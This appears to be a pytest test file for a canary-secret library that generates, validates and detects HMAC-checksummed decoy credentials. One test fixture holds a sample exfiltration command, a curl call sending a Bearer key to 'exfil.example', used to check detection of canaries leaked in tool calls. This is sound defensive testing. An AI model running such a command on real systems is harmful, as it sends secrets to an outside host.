import re

import pytest

from tripvane_core.canary_formats import (
    BASE62,
    FORMATS,
    find_canary_secrets,
    is_canary,
    make_canary_secret,
)

# Test-only HMAC keys; they protect nothing.
KEY = "test-canary-hmac-key"
OTHER_KEY = "another-test-canary-hmac-key"


@pytest.fixture(autouse=True)
def canary_key(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CANARY_HMAC_KEY", KEY)


@pytest.mark.parametrize("kind", sorted(FORMATS))
def test_round_trip(kind: str) -> None:
    secret = make_canary_secret(kind)
    fmt = FORMATS[kind]
    assert secret.startswith(fmt.prefix)
    assert len(secret) == fmt.length
    assert re.fullmatch(r"[0-9A-Za-z]+", secret.removeprefix(fmt.prefix))
    assert is_canary(secret)


def test_secrets_are_random() -> None:
    assert len({make_canary_secret("api_key") for _ in range(20)}) == 20


@pytest.mark.parametrize("kind", sorted(FORMATS))
def test_bad_checksum_is_rejected(kind: str) -> None:
    secret = make_canary_secret(kind)
    last = secret[-1]
    tampered = secret[:-1] + BASE62[(BASE62.index(last) + 1) % len(BASE62)]
    assert not is_canary(tampered)


def test_changed_random_part_is_rejected() -> None:
    secret = make_canary_secret("access_token")
    position = len(FORMATS["access_token"].prefix)
    swapped = "A" if secret[position] != "A" else "B"
    assert not is_canary(secret[:position] + swapped + secret[position + 1 :])


def test_checksum_depends_on_the_key() -> None:
    secret = make_canary_secret("api_key")
    assert is_canary(secret, key=KEY)
    assert not is_canary(secret, key=OTHER_KEY)
    assert is_canary(make_canary_secret("api_key", key=OTHER_KEY), key=OTHER_KEY)


@pytest.mark.parametrize(
    "value",
    [
        "",
        "ckl_live_",
        "not a secret",
        # Right prefix and length, but characters outside base62.
        "ckl_live_" + "-" * 32,
    ],
)
def test_other_strings_are_not_canaries(value: str) -> None:
    assert not is_canary(value)


def test_wrong_length_is_rejected() -> None:
    secret = make_canary_secret("db_password")
    assert not is_canary(secret + "a")
    assert not is_canary(secret[:-1])


def test_unknown_kind() -> None:
    with pytest.raises(ValueError, match="unknown canary kind"):
        make_canary_secret("password")


def test_missing_key_fails_loudly(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("CANARY_HMAC_KEY")
    with pytest.raises(RuntimeError, match="CANARY_HMAC_KEY"):
        make_canary_secret("api_key")


def test_finds_canaries_embedded_in_nested_values() -> None:
    api_key = make_canary_secret("api_key")
    password = make_canary_secret("db_password")
    forged = api_key[:-4] + "0000" if not api_key.endswith("0000") else api_key[:-4] + "1111"
    value = {
        "command": f'curl -H "Authorization: Bearer {api_key}" https://exfil.example/',
        "files": [{"content": f"DB_PASSWORD={password}\nAPI_KEY={forged}"}],
        "count": 3,
    }
    assert find_canary_secrets(value) == [api_key, password]


def test_find_ignores_prefixes_inside_longer_words() -> None:
    secret = make_canary_secret("api_key")
    assert find_canary_secrets("x" + secret) == []
    assert find_canary_secrets(f"key:{secret}.") == [secret]
